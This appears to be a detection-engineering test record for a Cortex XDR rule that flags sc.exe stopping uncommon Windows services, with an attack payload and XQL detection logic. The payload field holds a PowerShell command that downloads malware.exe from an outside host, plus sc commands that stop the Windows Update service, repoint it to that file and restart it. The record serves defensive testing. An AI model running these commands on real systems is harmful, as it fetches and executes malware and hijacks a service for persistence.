identity.name: Uncommon Service Stop Operation via sc.exe
identity.summary: An attacker uses sc.exe to stop a legitimate Windows service to disable security monitoring. Cortex detects this behavior as an uncommon service stop operation. The attack involves stopping a service
identity.description: An attacker uses sc.exe to stop a legitimate Windows service to disable security monitoring. Cortex detects this behavior as an uncommon service stop operation. The attack involves stopping a service using sc.exe with a non-standard service name.

techniques.name: Impair Defenses: Disable or Modify Tools

payload.code:
powershell -Command "Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\\temp\\malware.exe'"
sc stop "Windows Update"
sc config "Windows Update" binPath= "C:\\temp\\malware.exe"
sc start "Windows Update"

expected_artifacts.description: sc.exe process execution with stop command

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Service Stop Operation
biocs.description: Detection of sc.exe stopping a service that is not typically stopped by normal user activity
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'sc.exe' and action_file_path contains 'stop'
| filter causality_actor_process_image_name != 'services.exe'
| filter causality_actor_process_image_name != 'svchost.exe'
